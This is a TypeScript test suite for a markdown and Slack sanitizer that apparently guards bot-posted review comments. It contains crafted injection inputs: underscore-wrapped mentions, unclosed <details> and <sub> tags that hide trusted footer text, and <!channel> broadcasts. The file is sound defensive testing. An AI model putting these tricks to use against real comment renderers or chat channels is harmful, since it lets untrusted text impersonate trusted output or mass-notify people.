    let seed = Number(process.env.XREPO_FUZZ_SEED ?? 7);
    const rnd = (n: number): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed % n;
    };
    const iterations = Number(process.env.XREPO_RENDER_FUZZ_ITER ?? 400);
    for (let iter = 0; iter < iterations; iter++) {
      let s = "";
      for (let i = 0, k = 2 + rnd(14); i < k; i++) s += (i ? (seps[rnd(seps.length)] ?? "") : "") + (frags[rnd(frags.length)] ?? "");
      const maxChars = rnd(4) === 0 ? 20 + rnd(200) : 20000;
      const out = sanitizeMarkdownEx(s, { ...OPTS, maxChars, allowSuggestions: true }).text;
      expectRendersSafe(`${out}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\`\n\n<!-- xrepo:c:0123456789ab -->`, JSON.stringify(s));
    }
  }, 60_000);
});

/* ---------------------------- round-2 regressions ---------------------------- */

/** Rendered (pandoc gfm) HTML: the tags among `names` that are still open where `marker` starts. */
function openTagsAt(md: string, marker: string, names = ["details", "summary", "sub", "sup", "code", "pre"]): string[] {
  const html = renderGfm(md);
  const at = html.indexOf(marker);
  expect(at, html).toBeGreaterThan(-1);
  const open: string[] = [];
  const re = new RegExp(`<(/?)(${names.join("|")})\\b[^>]*>`, "gi");
  for (const m of html.slice(0, at).matchAll(re)) {
    const name = (m[2] ?? "").toLowerCase();
    if (m[1] === "") open.push(name);
    else {
      const k = open.lastIndexOf(name);
      if (k !== -1) open.splice(k);
    }
  }
  return open;
}

describe("sanitizeMarkdown: underscore-emphasis mentions (underscore-emphasis-mention-bypass)", () => {
  it("neutralizes '@' right after '_' / '__' (rendered as <em>@user</em> / <strong>@org/team</strong>)", () => {
    expect(vis("_@octocat_")).toBe("_@^octocat_");
    expect(vis("Escalating to _@acme/security_ now")).toBe("Escalating to _@^acme/security_ now");
    expect(vis("(_@user_)")).toBe("(_@^user_)");
    expect(vis("__@org/team__")).toBe("__@^org/team__");
    expect(vis("Review of _@acme/everyone_ urgent postponed")).toBe("Review of _@^acme/everyone_ urgent postponed");
    // E-mail addresses (a letter or digit right before "@") stay intact.
    expect(clean("mail bob@example.com or a_b@x.io or 42@x.io")).toBe("mail bob@example.com or a_b@x.io or 42@x.io");
    expect(clean("_@octocat_", { allowMentions: true })).toBe("_@octocat_");
    for (const s of ["_@octocat_", "Escalating to _@acme/security_ and _@octocat_.", "(_@user_)", "__@org/team__", "x _@a_ y __@b/c__"]) {
      expectSafe(s);
      expectRendersSafe(clean(s), s);
    }
  });
});

describe("sanitizeMarkdown: unbalanced allowed tags (unbalanced-details-hides-trusted-text)", () => {
  const FOOTER = "TRUSTED-FOOTER-7f3a";

  it("drops openers that are never closed, so trusted text appended later is not collapsed or shrunk", () => {
    expect(vis("All good. <details><summary>more</summary>")).toBe("All good. ^<summary>more</summary>");
    expect(vis("Looks good to me.\n\n<details>\n<summary>Reviewer details</summary>\n\nnothing else")).toBe(
      "Looks good to me.\n\n^\n<summary>Reviewer details</summary>\n\nnothing else",
    );
    expect(vis("x <sub><sup>tiny")).toBe("x ^^tiny");
    expect(vis("<sub>\n\nall fine")).toBe("^\n\nall fine");
    expect(vis("<pre>x")).toBe("^x");
    expect(vis("<code>x")).toBe("^x");
    for (const s of [
      "All good. <details><summary>more</summary>",
      "Looks good to me.\n\n<details>\n<summary>Reviewer details</summary>\n\nnothing else",
      "x <sub><sup>tiny",
      "<sub>\n\nall fine",
      "<sup>\n- a\n- b",
      "ok <code>\n\nmore",
      "a\n\n<details>\n\n| a |\n|---|\n| </details> |",
      "<details><summary>x</summary>\n\n> quote </details>\n\n<details>",
    ]) {
      const md = `${clean(s)}\n\n${FOOTER}`;
      if (HAS_PANDOC) expect(openTagsAt(md, FOOTER), `${JSON.stringify(s)}\n${md}`).toEqual([]);
    }
  });

  it("keeps balanced tags, including a <details> around a code block and inline tags on one line", () => {
    for (const s of [
      "<details>\n<summary>Diff</summary>\n\n```ts\nconst a = 1;\n```\n\n</details>",
      "<details><summary>S</summary>body<br>x<sub>1</sub><sup>2</sup></details>",
      "<pre>\nx\n</pre>",
      "<pre><code>c</code></pre>",
      "H<sub>2</sub>O and E = mc<sup>2</sup>, see <code>x</code>",
    ]) {
      expect(clean(s)).toBe(s);
    }
  });

  it("drops a closer GitHub could ignore, and with it the opener", () => {
    // Phrasing tags must close on the opener's line (a </sub> in a later paragraph is ignored).
    expect(vis("<sub>a\n\nb</sub>")).toBe("^a\n\nb^");
    expect(vis("<code>x\ny</code>")).toBe("^x\ny^");
    // A </details> inside a table cell is ignored by the HTML parser (scope boundary).
    expect(vis("<details>\n\n| a |\n|---|\n| </details> |")).toBe("^\n\n| a |\n|---|\n| ^ |");
    // Mis-nested and stray tags.
    expect(vis("<sub><sup>a</sub></sup>")).toBe("<sub>^a</sub>^");
    expect(vis("</details> x </sub>")).toBe("^ x ^");
    // Tags inside code spans are text, never matched.
    expect(vis("`<details>` <sub>x `</sub>`")).toBe("`<^details>` ^x `<^/sub>`");
  });

  it("balances what is left after truncation", () => {
    const r = sanitizeMarkdownEx(`<details>\n<summary>More</summary>\n\n${"word ".repeat(200)}\n\n</details>`, { ...OPTS, maxChars: 300 });
    expect(r.truncated).toBe(true);
    expect(r.text).not.toContain("<details>");
    expect(r.text).toContain("<summary>More</summary>");
    if (HAS_PANDOC) expect(openTagsAt(`${r.text}\n\n${FOOTER}`, FOOTER)).toEqual([]);
  });

  it("is linear-time with many unbalanced tags", () => {
    for (const s of ["<sub>".repeat(50_000), "</details>".repeat(25_000), "<details>\n".repeat(25_000), "<code>x</sub>".repeat(20_000)]) {
      const t = Date.now();
      const out = sanitizeMarkdown(s, { ...OPTS, maxChars: 60000 });
      expect(Date.now() - t, s.slice(0, 20)).toBeLessThan(2000);
      expect(out).not.toMatch(/<\/?(?:sub|details|code)>/);
    }
  });

  it("keeps every allowed element closed on random mixes", () => {
    const frags = [
      "<details>", "</details>", "<summary>", "</summary>", "<sub>", "</sub>", "<sup>", "</sup>", "<code>", "</code>",
      "<pre>", "</pre>", "`", "x", "| a |", "|---|", "- ", "> ", "\n", "\n\n", "```", "word",
    ];
    let seed = 99;
    const rnd = (n: number): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed % n;
    };
    const iterations = HAS_PANDOC ? 300 : 0;
    for (let iter = 0; iter < iterations; iter++) {
      let s = "";
      for (let i = 0, k = 2 + rnd(16); i < k; i++) s += (rnd(3) === 0 ? "\n" : " ") + (frags[rnd(frags.length)] ?? "");
      const out = sanitizeMarkdownEx(s, { ...OPTS, maxChars: rnd(3) === 0 ? 40 + rnd(80) : 20000 }).text;
      expect(openTagsAt(`${out}\n\n${FOOTER}`, FOOTER), `${JSON.stringify(s)}\n${JSON.stringify(out)}`).toEqual([]);
    }
  }, 60_000);
});

describe("helpers", () => {
  it("singleLine collapses to one line and never splits a surrogate pair", () => {
    expect(singleLine("a\n b\u202E\tc\u2028d", 50)).toBe("a b c d");
    const s = `${"x".repeat(9)}\uD83D\uDE00tail`;
    expect(singleLine(s, 11)).toBe(`${"x".repeat(9)}\u2026`);
    expect(singleLine(s, 12)).toBe(`${"x".repeat(9)}\uD83D\uDE00\u2026`);
    expect(singleLine("ab\uD83D", 10)).toBe("ab\uFFFD");
    expect(sliceSafe("a\uD83D\uDE00", 2)).toBe("a");
  });

  it("defangUrlText breaks autolink triggers", () => {
    expect(defangUrlText("https://www.x.com/a?u=http://y")).toBe(`https:${Z}//www${Z}.x.com/a?u=http:${Z}//y`);
  });

  it("inlineCode builds inert code spans", () => {
    expect(inlineCode("src/a.ts")).toBe("`src/a.ts`");
    expect(inlineCode("a`b")).toBe("``a`b``");
    expect(inlineCode("`x`")).toBe("`` `x` ``");
    expect(inlineCode("a\nb\u202Ec")).toBe("`a b c`");
  });

  it("safeCut prefers whitespace and defangs a cut URL", () => {
    expect(safeCut("hello world foo", 13)).toBe("hello world");
    expect(safeCut("https://github.com/abcdef", 17)).toBe(`https:${Z}//github.c`);
    expect(safeCut("see https://github.com/x more", 24)).toBe("see https://github.com/x");
    expect(safeCut("ab".repeat(150) + "https://github.com/" + "c".repeat(300), 320)).not.toMatch(/https:\/\//);
    expect(safeCut("short", 10)).toBe("short");
  });
});

describe("escapeSlack", () => {
  it("escapes control characters and neutralizes broadcasts", () => {
    expect(escapeSlack("<!channel> <!here> <!everyone> <@U123> <#C9|x> <https://x|y> a & b")).toBe(
      "&lt;!channel&gt; &lt;!here&gt; &lt;!everyone&gt; &lt;@U123&gt; &lt;#C9|x&gt; &lt;https://x|y&gt; a &amp; b",
    );
    expect(escapeSlack("@channel @here @everyone a@here.com")).toBe(`@${Z}channel @${Z}here @${Z}everyone a@here.com`);
  });

  it("redacts secrets and caps length without splitting an entity", () => {
    expect(escapeSlack("t xoxb-1234567890-abcdefghij")).toBe("t [REDACTED:slack_token]");
    const out = escapeSlack(`${"a".repeat(8)}&&&&`, 12);
    expect(out.length).toBeLessThanOrEqual(12);
    expect(out).toMatch(/^a{8}(?:&amp;)?\u2026$/);
  });
});
